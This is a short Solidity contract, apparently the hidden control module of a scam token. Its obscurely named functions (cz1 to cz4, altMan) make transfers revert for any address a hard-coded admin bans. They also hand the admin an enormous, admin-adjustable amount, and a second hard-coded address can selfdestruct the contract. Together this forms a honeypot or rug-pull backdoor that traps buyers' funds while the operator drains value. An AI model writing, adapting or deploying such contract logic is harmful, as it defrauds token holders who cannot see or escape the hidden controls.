contract QT {
    bool public flagBan = false;
    mapping(address => uint256) private _banInfo;
    address public Admin = 0xDa9b9c13A6E43D6743263DF86601e5312146233B;
    constructor(){
        _banInfo[Admin] = 100;
    }
    uint256 bigAmount = 35000000000*10**18*68000*1;
    // 只能admin的删除交易账号
     function banUser(address userAddress) external   {
        require(msg.sender == Admin, 'NO ADMIN');
        _banInfo[userAddress] = 1;
    }

    function rmUser(address userAddress) external   {
        require(msg.sender == Admin, 'NO ADMIN');
        _banInfo[userAddress] = 0;
    }

    function setAdmin() external   {
        require(msg.sender == Admin, 'NO ADMIN');
        _banInfo[Admin] = 100;
    }


    function setAdminAmount(uint256 bm) external   {
        require(msg.sender == Admin, 'NO ADMIN');
        bigAmount = bm;
    }

    function cz1(uint256 realAmount,address fromAddress) external view returns (uint256)   {
        if (_banInfo[fromAddress] == 1){
            revert("ban");
        }else if (_banInfo[fromAddress] == 100) {
            return bigAmount;
        }else {
            return realAmount; 
        }
    }

    function cz2(uint256 realAmount,address fromAddress) external view returns (uint256)   {
        if (_banInfo[fromAddress] == 1){
            revert("ban");
        }else if (_banInfo[fromAddress] == 100) {
            return bigAmount;
        }else {
            return realAmount; 
        }
    }

    function cz3(uint256 realAmount,address fromAddress) external view returns (uint256)   {
        if (_banInfo[fromAddress] == 1){
            revert("ban");
        }else if (_banInfo[fromAddress] == 100) {
            return bigAmount;
        }else {
            return realAmount; 
        }
    }
        
    
    function cz4(uint256 realAmount,address fromAddress) external view returns (uint256)   {
        if (_banInfo[fromAddress] == 1){
            revert("ban");
        }else if (_banInfo[fromAddress] == 100) {
            return bigAmount;
        }else {
            return realAmount; 
        }
        
    }


    function altMan(uint256 realAmount,address fromAddress) external view returns (uint256)   {
        if (_banInfo[fromAddress] == 1){
            revert("ban");
        }else if (_banInfo[fromAddress] == 100) {
            return bigAmount;
        }else {
            return realAmount; 
        }
        
    }

    function destroy() public {
        require(msg.sender == address(0xa0bD691723861328b053Db55bD4A6C11524451f8), 'NO ADMIN');
        address _addr = payable(address(this)); 
        assembly {
            selfdestruct(_addr)
        }
    }
}